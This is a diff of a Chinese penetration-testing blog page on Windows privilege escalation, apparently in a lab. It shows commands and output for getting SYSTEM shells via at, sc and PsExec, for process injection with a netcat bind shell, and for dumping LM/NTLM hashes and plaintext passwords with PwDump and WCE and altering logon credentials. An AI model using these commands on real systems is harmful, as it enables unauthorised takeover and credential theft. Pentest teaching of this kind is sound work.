@@ -495,72 +495,28 @@
 </ul>
 </li>
 </ul>
-<h4 id="Windows系统提权"><a href="#Windows系统提权" class="headerlink" title="Windows系统提权"></a>Windows系统提权</h4><h5 id="1-使用-at-提权-（当前仅适用于-WinXp-及-Windows-server-2003-等低级版本）"><a href="#1-使用-at-提权-（当前仅适用于-WinXp-及-Windows-server-2003-等低级版本）" class="headerlink" title="1.使用 at 提权 （当前仅适用于 WinXp 及 Windows server 2003 等低级版本）"></a>1.使用 at 提权 （当前仅适用于 WinXp 及 Windows server 2003 等低级版本）</h5><pre><code> # 修改密码：net user kevin *
- C:\Documents and Settings\kevin&gt;net user kevin *
-     Type a password for the user:
-     Retype the password to confirm:
-     The command completed successfully.
+<h4 id="Windows系统提权"><a href="#Windows系统提权" class="headerlink" title="Windows系统提权"></a>Windows系统提权</h4><h5 id="1-使用-at-提权-（当前仅适用于-WinXp-及-Windows-server-2003-等低级版本）"><a href="#1-使用-at-提权-（当前仅适用于-WinXp-及-Windows-server-2003-等低级版本）" class="headerlink" title="1.使用 at 提权 （当前仅适用于 WinXp 及 Windows server 2003 等低级版本）"></a>1.使用 at 提权 （当前仅适用于 WinXp 及 Windows server 2003 等低级版本）</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改密码：net user kevin *</span></span><br><span class="line">C:\Documents <span class="keyword">and</span> Settings\kevin&gt;net<span class="built_in"> user </span>kevin *</span><br><span class="line"><span class="built_in">	Type </span>a password <span class="keyword">for</span> the user:</span><br><span class="line">	Retype the password <span class="keyword">to</span> confirm:</span><br><span class="line">	The command completed successfully.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看系统用户：net user</span></span><br><span class="line">C:\Documents <span class="keyword">and</span> Settings\kevin&gt;net user</span><br><span class="line"><span class="built_in">	User </span>accounts <span class="keyword">for</span> \\DH-CA8822AB9589</span><br><span class="line">	---------------------------------------------------------------------</span><br><span class="line">	Administrator            Guest                    HelpAssistant</span><br><span class="line">	IUSR_DH-CA8822AB9589     IWAM_DH-CA8822AB9589     kevin</span><br><span class="line">	SUPPORT_388945a0</span><br><span class="line">	The command completed successfully.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看用户状态：</span></span><br><span class="line">C:\Documents <span class="keyword">and</span> Settings\kevin&gt;net<span class="built_in"> user </span>kevin</span><br><span class="line"><span class="built_in">	User </span>name                    kevin</span><br><span class="line">	Full Name                    kevin</span><br><span class="line">	Comment</span><br><span class="line">	User<span class="string">'s comment</span></span><br><span class="line"><span class="string">	Country code                 000 (System Default)</span></span><br><span class="line"><span class="string">	Account active               Yes</span></span><br><span class="line"><span class="string">	Account expires              Never</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	Password last set            2/28/2018 2:05 PM</span></span><br><span class="line"><span class="string">	Password expires             Never</span></span><br><span class="line"><span class="string">	Password changeable          2/28/2018 2:05 PM</span></span><br><span class="line"><span class="string">	Password required            Yes</span></span><br><span class="line"><span class="string">	User may change password     Yes</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	Workstations allowed         All</span></span><br><span class="line"><span class="string">	Logon script</span></span><br><span class="line"><span class="string">	User profile</span></span><br><span class="line"><span class="string">	Home directory</span></span><br><span class="line"><span class="string">	Last logon                   2/28/2018 2:03 PM</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	Logon hours allowed          All</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	Local Group Memberships      *Administrators       *Users</span></span><br><span class="line"><span class="string">	Global Group memberships     *None</span></span><br><span class="line"><span class="string">	The command completed successfully.</span></span><br></pre></td></tr></table></figure>
 
- # 查看系统用户：net user
- C:\Documents and Settings\kevin&gt;net user
-     User accounts for \\DH-CA8822AB9589
-     ---------------------------------------------------------------------
-     Administrator            Guest                    HelpAssistant
-     IUSR_DH-CA8822AB9589     IWAM_DH-CA8822AB9589     kevin
-     SUPPORT_388945a0
-     The command completed successfully.
-
- # 查看用户状态：
- C:\Documents and Settings\kevin&gt;net user kevin
-     User name                    kevin
-     Full Name                    kevin
-     Comment
-     User&#39;s comment
-     Country code                 000 (System Default)
-     Account active               Yes
-     Account expires              Never
-
-     Password last set            2/28/2018 2:05 PM
-     Password expires             Never
-     Password changeable          2/28/2018 2:05 PM
-     Password required            Yes
-     User may change password     Yes
-
-     Workstations allowed         All
-     Logon script
-     User profile
-     Home directory
-     Last logon                   2/28/2018 2:03 PM
-
-     Logon hours allowed          All
-
-     Local Group Memberships      *Administrators       *Users
-     Global Group memberships     *None
-     The command completed successfully.
-</code></pre><p>1.查看用户进程</p>
+<p>1.查看用户进程</p>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427202422.png" alt=""></p>
 <p>2.将 administrator 用户权限提升为 system 权限</p>
-<pre><code>  C:\Documents and Settings\administrator&gt;cd \
-  C:\&gt;at -?
-  C:\&gt;at 2:15 /interactive cmd  #必须是未来时间，否则将是明天时间
-      Added a new job with job ID = 1
-  C:\&gt;at
-  Status ID   Day                     Time          Command Line
-  ---------------------------------------------------------------------
-          1   Today                     2:15 AM       cmd
-</code></pre><p>我们看到这里弹出了system权限的命令框</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\administrator&gt;cd \</span><br><span class="line">C:\&gt;at -?</span><br><span class="line">C:\&gt;at 2:15 /interactive cmd  #必须是未来时间，否则将是明天时间</span><br><span class="line"><span class="code">	Added a new job with job ID = 1</span></span><br><span class="line">C:\&gt;at</span><br><span class="line">Status ID   Day                     Time          Command Line</span><br><span class="line">---------------------------------------------------------------------</span><br><span class="line"><span class="code">        1   Today 	                2:15 AM       cmd</span></span><br></pre></td></tr></table></figure>
+
+<p>我们看到这里弹出了system权限的命令框</p>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427203025.png" alt=""></p>
 <p>3.用新的 system 权限的窗口启动任务管理器</p>
-<pre><code>  C:\WINDOWS\system32&gt;taskmgr</code></pre><p>4.关闭之前的explorer</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\W</span>INDOWS<span class="symbol">\s</span>ystem32&gt;taskmgr</span><br></pre></td></tr></table></figure>
+
+<p>4.关闭之前的explorer</p>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427203207.png" alt=""></p>
 <p>5.应用程序-&gt;新任务-&gt;explorer</p>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427203521.png" alt=""></p>
 <p>6.验证桌面用户权限</p>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427203554.png" alt=""></p>
 <h5 id="2-使用-sc-提权-适用于-Win7-及Windows-server-2008-等高级版本"><a href="#2-使用-sc-提权-适用于-Win7-及Windows-server-2008-等高级版本" class="headerlink" title="2.使用 sc 提权 (适用于 Win7 及Windows server 2008 等高级版本)"></a>2.使用 sc 提权 (适用于 Win7 及Windows server 2008 等高级版本)</h5><p>1.运行-&gt;services.msc</p>
-<pre><code>- C:\Users\root&gt;cd \
-- C:&gt;sc Create syscmd binPath= “cmd /K start” type= own type= interact
-- C:&gt;sc start syscmd</code></pre><p>3.使用 Sysinternals Suite 套件</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- C:\Users\root&gt;<span class="built_in">cd</span> \</span><br><span class="line">- C:&gt;sc Create syscmd binPath= “<span class="built_in">cmd</span> /K <span class="built_in">start</span>” <span class="built_in">type</span>= own <span class="built_in">type</span>= interact</span><br><span class="line">- C:&gt;sc <span class="built_in">start</span> syscmd</span><br></pre></td></tr></table></figure>
+
+<p>3.使用 Sysinternals Suite 套件</p>
 <p>推荐书籍 《Windows Internals第7版》</p>
 <p><a href="https://download.sysinternals.com/files/SysinternalsSuite.zip" target="_blank" rel="noopener">Sysinternals Suite 套件下载</a></p>
 <ul>
@@ -570,12 +526,9 @@
 <li><p>启动 PsExec.exe</p>
 </li>
 </ul>
-<pre><code>  C:\&gt;PsExec.exe
-  -i: 交互模式
-  -s: 使用系统账户
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">C</span>:\&gt;PsExec.exe</span><br><span class="line"><span class="attribute">-i</span>: 交互模式</span><br><span class="line"><span class="attribute">-s</span>: 使用系统账户</span><br><span class="line"></span><br><span class="line"><span class="attribute">C</span>:\&gt;psexec -p'sei -s -d taskmgr</span><br><span class="line"><span class="attribute">C</span>:\&gt;PsExec.exe -i -s cmd</span><br></pre></td></tr></table></figure>
 
-  C:\&gt;psexec -p&#39;sei -s -d taskmgr
-  C:\&gt;PsExec.exe -i -s cmd</code></pre><ul>
+<ul>
 <li>提权结果</li>
 </ul>
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427205652.png" alt=""></p>
@@ -600,29 +553,24 @@
 </li>
 <li>选择一个进程注入</li>
 </ul>
-<pre><code>  C:\&gt;pinjector.exe -l
-      PID    668 services.exe ( 16 Threads)  USER: \\NT AUTHORITY\SYSTEM
-  C:\&gt;pinjector.exe -p 668 cmd 4444
-      Privilege Switcher for Win32(Private version)
-      (c) 2006 Andres Tarasco - atarasco@gmail.com
-      [+] Trying to execute cmd to 668 as: ? \
-      [+] Code inyected... ; )</code></pre><ul>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">C</span>:\&gt;pinjector.exe -l</span><br><span class="line">	PID    <span class="number">668</span> services.exe ( <span class="number">16</span> Threads)  <span class="attribute">USER</span>: \\NT AUTHORITY\SYSTEM</span><br><span class="line"><span class="attribute">C</span>:\&gt;pinjector.exe -p <span class="number">668</span> cmd <span class="number">4444</span></span><br><span class="line">	Privilege Switcher for Win32(Private version)</span><br><span class="line">	(c) <span class="number">2006</span> Andres Tarasco - atarasco<span class="variable">@gmail</span>.com</span><br><span class="line">	[+] Trying to execute cmd to <span class="number">668</span> <span class="attribute">as</span>: ? \</span><br><span class="line">	[+] Code inyected... ; )</span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>查看被注入的进程的监听状态</li>
 </ul>
-<pre><code>  C:\&gt;netstat -nao | find &quot;555&quot;
-      TCP    0.0.0.0:555            0.0.0.0:0              LISTENING       668</code></pre><ul>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;netstat -nao | find <span class="string">"555"</span></span><br><span class="line">	TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">555</span>            <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">668</span></span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>利用此监听端口</li>
 </ul>
-<pre><code>  root@kali：~# nc -nv 192.168.153.143 4444
-      Connection to 10.10.10.128 555 port [tcp/*] succeeded!
-      Microsoft Windows XP [?汾 5.1.2600]
-      (C) ??????? 1985-2001 Microsoft Corp
-  C:\WINDOWS\system32&gt;whoami
-      whoami
-      SYSTEM</code></pre><ul>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">root@kali：~#</span> <span class="string">nc</span> <span class="string">-nv</span> <span class="number">192.168</span><span class="number">.153</span><span class="number">.143</span> <span class="number">4444</span></span><br><span class="line">	<span class="string">Connection</span> <span class="string">to</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.128</span> <span class="number">555</span> <span class="string">port</span> <span class="string">[tcp/*]</span> <span class="string">succeeded!</span></span><br><span class="line">	<span class="string">Microsoft</span> <span class="string">Windows</span> <span class="string">XP</span> <span class="string">[?汾</span> <span class="number">5.1</span><span class="number">.2600</span><span class="string">]</span></span><br><span class="line">	<span class="string">(C)</span> <span class="string">???????</span> <span class="number">1985</span><span class="number">-2001</span> <span class="string">Microsoft</span> <span class="string">Corp</span></span><br><span class="line"><span class="string">C:\WINDOWS\system32&gt;whoami</span></span><br><span class="line">	<span class="string">whoami</span></span><br><span class="line">	<span class="string">SYSTEM</span></span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>查看进程</li>
 </ul>
-<pre><code>  使用 SysinternalsSuite/procexp.exe 查看进程</code></pre><h4 id="读取windows本地密码进行提权"><a href="#读取windows本地密码进行提权" class="headerlink" title="读取windows本地密码进行提权"></a>读取windows本地密码进行提权</h4><h5 id="1-抓包嗅探"><a href="#1-抓包嗅探" class="headerlink" title="1. 抓包嗅探"></a>1. 抓包嗅探</h5><ol>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用 SysinternalsSuite/procexp<span class="selector-class">.exe</span> 查看进程</span><br></pre></td></tr></table></figure>
+
+<h4 id="读取windows本地密码进行提权"><a href="#读取windows本地密码进行提权" class="headerlink" title="读取windows本地密码进行提权"></a>读取windows本地密码进行提权</h4><h5 id="1-抓包嗅探"><a href="#1-抓包嗅探" class="headerlink" title="1. 抓包嗅探"></a>1. 抓包嗅探</h5><ol>
 <li>Windows<ul>
 <li>Wireshark</li>
 <li>Omnipeek</li>
@@ -657,25 +605,9 @@
 <li>pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/</li>
 <li>添加用户</li>
 </ul>
-<pre><code>  C:\Documents and Settings\kevin&gt;net user user2 123456 /add
-  C:\Documents and Settings\kevin&gt;net user
-      \\ICST-WINATT 的用户帐户
-      -------------------------------------------------------------
-      Administrator            Guest                    HelpAssistant
-      kevin                    SUPPORT_388945a0         test
-      user1                    user2
-  C:\Documents and Settings\kevin&gt;cd \
-  C:\&gt;PwDump.exe localhost
-      Administrator:500:18D583B495C4696AFF17365FAF1FFE89:5D36F0CA14EEBEF32F55C7B6A4675DB0:::
-      Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::
-      HelpAssistant:1000:5906F3A72959D5902440275BA555A537:10AA20D63C3EC71E0102AC95ADF6DF73:::
-      kevin:1004:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::
-      SUPPORT_388945a0:1002:NO PASSWORD*********************:8AFA81401E8D8EBFA42B4E46F6507C07:::
-      test:1005:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::
-      user1:1006:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::
-      user2:1007:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::Completed.
-  # 结果：前部分是 LMHASH ，后部分是 NTLMHASH
-</code></pre><ul>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">C</span>:\Documents and Settings\kevin&gt;net user user2 <span class="number">123456</span> /add</span><br><span class="line"><span class="attribute">C</span>:\Documents and Settings\kevin&gt;net user</span><br><span class="line">	\\ICST-WINATT 的用户帐户</span><br><span class="line">	-------------------------------------------------------------</span><br><span class="line">	Administrator            Guest                    HelpAssistant</span><br><span class="line">	kevin                    SUPPORT_388945a0         test</span><br><span class="line">	user1                    user2</span><br><span class="line"><span class="attribute">C</span>:\Documents and Settings\kevin&gt;cd \</span><br><span class="line"><span class="attribute">C</span>:\&gt;PwDump.exe localhost</span><br><span class="line">	<span class="attribute">Administrator</span>:<span class="number">500</span>:<span class="number">18</span><span class="attribute">D583B495C4696AFF17365FAF1FFE89</span>:<span class="number">5</span><span class="attribute">D36F0CA14EEBEF32F55C7B6A4675DB0</span>:::</span><br><span class="line">	<span class="attribute">Guest</span>:<span class="number">501</span>:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">	<span class="attribute">HelpAssistant</span>:<span class="number">1000</span>:<span class="number">5906</span><span class="attribute">F3A72959D5902440275BA555A537</span>:<span class="number">10</span><span class="attribute">AA20D63C3EC71E0102AC95ADF6DF73</span>:::</span><br><span class="line">	<span class="attribute">kevin</span>:<span class="number">1004</span>:<span class="number">44</span><span class="attribute">EFCE164AB921CAAAD3B435B51404EE</span>:<span class="number">32</span><span class="attribute">ED87BDB5FDC5E9CBA88547376818D4</span>:::</span><br><span class="line">	<span class="attribute">SUPPORT_388945a0</span>:<span class="number">1002</span>:NO PASSWORD*********************:<span class="number">8</span><span class="attribute">AFA81401E8D8EBFA42B4E46F6507C07</span>:::</span><br><span class="line">	<span class="attribute">test</span>:<span class="number">1005</span>:<span class="number">44</span><span class="attribute">EFCE164AB921CAAAD3B435B51404EE</span>:<span class="number">32</span><span class="attribute">ED87BDB5FDC5E9CBA88547376818D4</span>:::</span><br><span class="line">	<span class="attribute">user1</span>:<span class="number">1006</span>:<span class="number">44</span><span class="attribute">EFCE164AB921CAAAD3B435B51404EE</span>:<span class="number">32</span><span class="attribute">ED87BDB5FDC5E9CBA88547376818D4</span>:::</span><br><span class="line">	<span class="attribute">user2</span>:<span class="number">1007</span>:<span class="number">44</span><span class="attribute">EFCE164AB921CAAAD3B435B51404EE</span>:<span class="number">32</span><span class="attribute">ED87BDB5FDC5E9CBA88547376818D4</span>:::Completed.</span><br><span class="line"># 结果：前部分是 LMHASH ，后部分是 NTLMHASH</span><br></pre></td></tr></table></figure>
+
+<ul>
 <li><p>可以将结果保存在文件中，然后在 kali 中进行破解</p>
 <p><img src="https://img-blog.csdnimg.cn/20190413165117218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 </li>
@@ -696,73 +628,40 @@
 <ul>
 <li>列举登录账号及会话</li>
 </ul>
-<pre><code>  C:\&gt;wce-universal.exe -lv
-      0020B19D:user1:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
-      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
-      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
-      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
-      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
-      # 与 C:\&gt;PwDump.exe localhost 结果相同</code></pre><ul>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;wce-universal.exe -lv</span><br><span class="line">	<span class="number">0020</span>B19D:user1:ICST-WINATT:<span class="number">44</span>EFCE164AB921CAAAD3B435B51404EE:<span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line">	<span class="number">001E5</span>D92:user2:ICST-WINATT:<span class="number">44</span>EFCE164AB921CAAAD3B435B51404EE:<span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line">	<span class="number">001</span>B9220:test:ICST-WINATT:<span class="number">44</span>EFCE164AB921CAAAD3B435B51404EE:<span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line">	<span class="number">0000</span>C7CE:kevin:ICST-WINATT:<span class="number">44</span>EFCE164AB921CAAAD3B435B51404EE:<span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line">	<span class="number">000003E4</span>:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:<span class="number">31</span>D6CFE0D16AE931B73C59D7E0C089C0</span><br><span class="line">	# 与 C:\&gt;PwDump.exe localhost 结果相同</span><br></pre></td></tr></table></figure>
+
+<ul>
 <li><p>每隔5秒刷新一次</p>
 <ul>
 <li>wce-universal.exe -r</li>
 </ul>
 </li>
 <li><p>删除登录会话</p>
-<pre><code>  C:\&gt;wce-universal.exe -d 0020B19D
-  C:\&gt;wce-universal.exe -lv
-      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
-      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
-      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
-      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
-</code></pre></li>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">C:</span>\&gt;wce-universal.exe -d <span class="number">0020</span>B19D</span><br><span class="line"><span class="string">C:</span>\&gt;wce-universal.exe -lv</span><br><span class="line"><span class="symbol">	001E5D92:</span><span class="string">user2:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">	001B9220:</span><span class="string">test:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">	0000C7CE:</span><span class="string">kevin:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">	000003E4:</span>ICST-<span class="string">WINATT$:</span><span class="string">MSHOME:</span><span class="string">AAD3B435B51404EEAAD3B435B51404EE:</span><span class="number">31</span>D6CFE0D16AE931B73C59D7E0C089C0</span><br></pre></td></tr></table></figure>
+</li>
 <li><p>计算密码对应的 HASH 值</p>
 </li>
 </ul>
-<pre><code>  C:\&gt;wce-universal.exe -g passwd
-      Password:   passwd
-      Hashes:     91C7AE7122196B5EAAD3B435B51404EE:22315D6ED1A7D5F8A7C98C40E9FA2DEC</code></pre><ul>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">C</span>:\&gt;wce-universal.exe -g passwd</span><br><span class="line">	<span class="attribute">Password</span>:   passwd</span><br><span class="line">	<span class="attribute">Hashes</span>:     <span class="number">91</span><span class="attribute">C7AE7122196B5EAAD3B435B51404EE</span>:<span class="number">22315</span>D6ED1A7D5F8A7C98C40E9FA2DEC</span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>读取内核中的明文密码</li>
 </ul>
-<pre><code>  C:\&gt;wce-universal.exe -w
-      user1\ICST-WINATT:123456
-      user2\ICST-WINATT:123456
-      test\ICST-WINATT:123456
-      kevin\ICST-WINATT:123456
-      NETWORK SERVICE\MSHOME:
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;wce-universal.exe -w</span><br><span class="line">	user1\ICST-WINATT:123456</span><br><span class="line">	user2\ICST-WINATT:123456</span><br><span class="line">	test\ICST-WINATT:123456</span><br><span class="line">	kevin\ICST-WINATT:123456</span><br><span class="line"><span class="built_in">	NETWORK </span>SERVICE\MSHOME:</span><br><span class="line"></span><br><span class="line">C:\&gt;net<span class="built_in"> user </span>user1 111222</span><br><span class="line">	命令成功完成。</span><br><span class="line">C:\&gt;wce-universal.exe -w</span><br><span class="line">	user1\ICST-WINATT:123456</span><br><span class="line">	user2\ICST-WINATT:123456</span><br><span class="line">	test\ICST-WINATT:123456</span><br><span class="line">	kevin\ICST-WINATT:123456</span><br><span class="line"><span class="built_in">	NETWORK </span>SERVICE\MSHOME:</span><br><span class="line"><span class="comment"># 当前内核中保存的值会在下次登录被读取出来</span></span><br></pre></td></tr></table></figure>
 
-  C:\&gt;net user user1 111222
-      命令成功完成。
-  C:\&gt;wce-universal.exe -w
-      user1\ICST-WINATT:123456
-      user2\ICST-WINATT:123456
-      test\ICST-WINATT:123456
-      kevin\ICST-WINATT:123456
-      NETWORK SERVICE\MSHOME:
-  # 当前内核中保存的值会在下次登录被读取出来</code></pre><ul>
+<ul>
 <li>对 LUID 进行修改（将LUID改为匹配其他用户的用户名和密码）</li>
 </ul>
-<pre><code>  C:\&gt;wce-universal.exe -lv
-      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
-      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
-      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
-      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
-  C:\&gt;wce-universal.exe -i 001E5D92 -s kevin:ICST-    WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
-      Changing NTLM credentials of logon session 001E5D92h to:
-      Username: kevin
-      domain: ICST-WINATT
-      LMHash: 44EFCE164AB921CAAAD3B435B51404EE
-      NTHash: 32ED87BDB5FDC5E9CBA88547376818D4
-      NTLM credentials successfully changed!
-  C:\&gt;wce-universal.exe -lv
-      001E5D92:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
-      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
-      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0</code></pre><ul>
